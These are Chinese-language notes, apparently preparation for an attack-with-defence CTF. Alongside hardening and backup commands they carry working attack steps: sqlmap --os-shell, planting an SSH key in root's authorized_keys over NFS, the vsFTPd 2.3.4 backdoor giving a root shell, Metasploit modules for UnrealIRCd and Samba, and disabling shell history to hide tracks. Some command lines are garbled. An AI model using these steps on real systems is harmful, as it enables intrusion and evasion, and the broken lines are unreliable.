## 准备

[reverse shell manager](https://github.com/WangYihang/Platypus)
[web shell manager](https://github.com/WangYihang/Webshell-Sniper)

- 备份 www
- 备份 passwd
- linux_check
- 修改默认口令
- 配置 waf，文件监控，日志记录
- /var/www/html/ 设置为不可写

第一步：修改 ssh密码 数据库密码
ssh密码修改：sudo passwd user //xingchen@123
mysql密码修改： set password for 'root'@'localhost' = password\('35hfnuz'\);
update admin set logpass='你准备的密码字符串' where xxx='xxx' 限定修改的帐号
eg:update admin set user_pass='35hfnu?z' where user_id=1;
python sqlmap.py -d "mysql://root:root@192.168.43.159:8803/mysql" --os-shell


第二步：备网站源码 数据库
nginx： 默认在usr/local/nginx/html, 可以输入nginx -t查看配置文件目录来找到路径
Apache: 默认在/var/www/html，配置文件在/etc/httpd/conf/httpd.conf
备份网站源码
tar zcf backup.zip /var/www/html
使用Winscp等工具下载var/www/html下的文件，备份
tar -zcvf web.tar /var/www/html 备份源码
tar -zcf /tmp/name.tar /path/web
解包tar -zxvf archive_name.tar

备份数据库
登陆数据库，命令备份数据库(2选1):
mysqldump -u root -p --events --events --ignore-table=mysql.events --all-database>fsz888backup7.sql
mysqldump -u root -p --all-databases>fsz888backup7.sql

还原数据库：
mysql -u root -p < fsz888backup7.sql

重置sql数据库密码
方法1：用SET PASSWORD命令
mysql> set password for 用户名@localhost = password('xingchenfsz.');
方法2：用mysqladmin
mysqladmin -u用户名 -p旧密码 password 新密码
ps：如果是数据库弱密码的话，尝试能不能登陆数据库改密码、写shell、或者删库。
准备 AWD_weaksql脚本、修改密码脚本、删库脚本
set password for 'root'@'localhost' = password('root');



第三步：D盾扫描，删除预留后门
如果后门直接删除。
或者在源码里，全局搜索危险函数。
危险函数如下：
eval(),assert(),create_funtion,array_map，system(),passthru(),exec(),shell_exec(),popen()
fopen(),file_get_contents(),curl_exec(),readfile(),require(),require_once(),include(),include_once()
grep "flag" -R /var/www/html

前期如果可以利用好预置后门，将权限维持并得到分数，你甚至不需要去挖掘其他漏洞就可以主宰比赛，所以开始时的反应速度很重要，我们可以利用相关工具入（D盾）查杀一些比较明显的后门，并进行快速利用。
接着就是进行权限维持的阶段了，在你发现了漏洞攻击对手的时候，他人一定也会对他的服务进行修复和维护，特别在一些挂了waf的服务中，我们很可能就泄露了自己的漏洞利用点，当对手将漏洞修复之后，我们的权限也就不复存在了，所以我们需要进行权限维持，权限维持和进阶操作我将会在第三期进行详述


第四步：挂waf 上狗
使用方法：
find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name '*.php'|xargs  sed -i '1i<?php require_once("/var/www/html/drop_wiki.php");?>'
1.将waf.php传到要包含的文件的目录
2.在页面中加入防护，有两种做法，根据情况二选一即可：
在所需要防护的页面加入代码：require_once('drop_wiki.php');
如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！
添加require_once('drop_wiki.php');来调用本代码
常用php系统添加文件
PHPCMS V9 \phpc
## blog

https://0day.design/2018/12/20/HCTF%202018%20AWD%E5%B0%8F%E7%BB%93
https://github.com/admintony/Prepare-for-AWD

- D 盾扫后门
- chattr -i
- 改 cd ls curl wget 常用命令
- getflag 所需命令改名
-

## 防御

- webshell、后门、木马查杀
  - http://www.shellpub.com/
  - D 盾
  - 火绒
- netstat：端口，连接排查方法
- 如何 kill 进程/防止 kill
- 改 rw/a 权限
- 目录禁止写入
- 删解释器
- sql 防注入代码
- 日志管理
- 文件监控
- umask?
- 网络端口监控
- waf 过滤 sqlmap //sql 改 head
- 上传漏洞防护
- webshell 扫描器
- linux 后门发现 chkrootkit

## 攻击

- 提权脚本
- 白盒审计工具
- 批量端口扫描 http，爆破 phpmyadmin ssh mysql
- 上传、权限维持脚本
- 扫描 webshell,路径爆破
- 端口扫描
- Cain4.9 多口令破解测试
- arp 欺骗工具
- Wordpress 综合检测工具?
- 各大 cms get shell
- 后门批量上传，管理
- 后门开机启动 定时运行
- 自动化程度提高
- php 5.10 poc
- xss 打 cookie
- 自动化攻击，提交
- 中国特色字典
- bash 不记录历史记录

```
export HISTFILE=/dev/null
export HISTSILZ
```

```bash
lsb_release  -a
file /bin/ls
getconf LONG_BIT
cat /etc/issue
uname -a
whoami
ssh user@remote_server tail -f /var/log/apache2/access.log | ngxtop -f
ssh msfadmin@192.168.189.131 tail -f /var/log/apache2/access.log | ngxtop -f
```

## 虚拟化判断

//todo
https://www.bboysoul.com/2017/11/08/%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E5%88%A4%E6%96%AD%E4%BD%A0%E7%9A%84vps%E4%BD%BF%E7%94%A8%E4%BB%80%E4%B9%88%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E7%9A%84%E5%B7%A5%E5%85%B7/
  
https://people.redhat.com/~rjones/virt-what/

## 发现

angry ip scanner
nmap
rustscan

## 常用命令

```shell
scp 文件路径 用户名@IP:存放路径
who 查看tty
pkill ‐kill ‐t <用户tty>
#查看已建立的网络连接及进程
netstat ‐antulp | grep EST
#查看指定端口被哪个进程占用
lsof ‐i:端口号 或者 netstat ‐tunlp|grep 端口号
#结束进程命令
kill PID
killall <进程名>
kill ‐ <PID>
#封杀某个IP或者ip段，如:.
iptables ‐I INPUT ‐s . ‐j DROP
iptables ‐I INPUT ‐s ./ ‐j DROP #禁止从某个主机ssh远程访问登陆到本机，如123..
iptable ‐t filter ‐A INPUT ‐s . ‐p tcp ‐‐dport ‐j DROP
#备份mysql数据库
mysqldump ‐u 用户名 ‐p 密码 数据库名 > back.sql
mysqldump ‐‐all‐databases > bak.sql
#还原mysql数据库
mysql ‐u 用户名 ‐p 密码 数据库名 < bak.sql
find / *.php ‐perm
awk ‐F: /etc/passwd
crontab ‐l
#检测所有的tcp连接数量及状态
netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
#查看页面访问排名前十的IP
cat /var/log/apache2/access.log | cut ‐f1 ‐d
r | head ‐
#查看页面访问排名前十的URL
cat /var/log/apache2/access.log | cut ‐f4 ‐d
r | head ‐
```

netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn
win:netstat -no 查看网络链接

# 防御&&attack

## 防篡改

chattr +i /etc/profile
chattr -R +i /var/www/html
chattr +a /var/log 只能追加

## 进程检查

如果我们怀疑某个进程正在是受到溢出攻击后创建的 shell 进程，我们可以分析这个进程是否有 socket 连接，linux 中查看指定进程 socket 连接数的命令为:
比如我们查看 ssh 进程的 socket 连接。如果我们检测的程序有 socket 连接，说明它正在进行网络通信，我们就需要进行进一步判断。

## 检查 nfs

rpcinfo -p 192.168.189.131
showmount -e
mkdir /tmp/r00t

mount -t nfs 192.168.99.131:/ /tmp/r00t/

cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys

umount /tmp/r00t

ssh root@192.168.99.131

## ftp ssh 配置文件检查

    telnet 192.168.99.131 21

    Trying 192.168.99.131…

    Connected to 192.168.99.131.

    Escape character is &#039;^]&#039;.

    220 (vsFTPd 2.3.4)

    user backdoored:)

    331 Please specify the password.

    pass invalid

    ^]

    telnet> quit

telnet 192.168.99.131 6200

Trying 192.168.99.131…

Connected to 192.168.99.131.

Escape character is &#039;^]&#039;.

id;

uid=0(root) gid=0(root)

## 6667 端口上运行着 UnreaIRCD IRC

use exploit/unix/irc/unreal_ircd_3281_backdoor
getshell

## ingreslock 后门

telnet 192.168.99.131 1524

## smb 后门

配置为文件权限可写同时"wide links" 被允许（默认就是允许），同样可以被作为后门而仅仅是文件共享。下面例子里，metasploit 提供一个攻击模块，允许接入一个 root 文件系统通过一个匿名接入和可写入的共享设置。
smbclient -L //192.168.99.131
use auxiliary/admin/smb/samba_symlink_traversal
set RHOST 192.168.99.131
set SMBSHARE tmp
exploit

smbclient //192.168.99.131/tmp
getshell

## dwa 后门

Default username = admin
Default password = password

##php 漏洞
CVE–2012-1823 和 CVE–2012-2311

# 查看页面访问排名前十的 IP

netstat ‐ant|awk |grep |sed ‐e ‐e |sort|uniq ‐c|sort ‐rn

http://bobao.360.cn/ctf/learning/210.html  
https://bbs.ichunqiu.com/thread-25092-1-1.html?from=aqzx2
